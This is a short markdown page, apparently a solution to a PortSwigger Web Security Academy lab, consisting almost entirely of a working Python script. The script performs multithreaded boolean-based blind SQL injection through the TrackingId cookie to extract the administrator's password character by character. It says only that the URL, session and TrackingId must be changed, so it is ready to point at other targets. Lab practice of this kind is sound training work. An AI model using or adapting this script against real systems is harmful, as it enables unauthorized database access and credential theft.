# Blind SQL Injection - MultiThreading

***Boolean Based Blind SQL Injection - MultiThreading***

Must Change Variables - `URL / Session / TrackingId`

```python
import requests
import string
from concurrent.futures import ThreadPoolExecutor
import time

def multiThreading():
    
    ts = time.perf_counter()
    session = requests.Session()
    
    url = 'https://0a4a00d503e1fc4e847fb54100710025.web-security-academy.net/'
    chars = string.digits + string.ascii_letters
    index = list(range(1,21))
    password = ""
    found = ""

    def Threads(wordlist):
        for char in chars:
            cookies = {
                "session": "Epi0ZPyJm1Bhbz3mFyWIiT1WARHt4FF",
                "TrackingId": f"XTFztPUmfY10NGYS' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {wordlist}, 1) = '{char}"
            }
            req = session.get(url, cookies=cookies, timeout=10)
            if 'Welcome back!' in req.text:
                return char
        return ""

    with ThreadPoolExecutor(max_workers=50) as executor:
        processes = executor.map(Threads,index)

    
    password = ''.join(processes)

    te = time.perf_counter()

    print(f"[+] Password extracted: {password}")
    print(f"[+] Time taken: {te - ts:.2f} seconds")

multiThreading()
```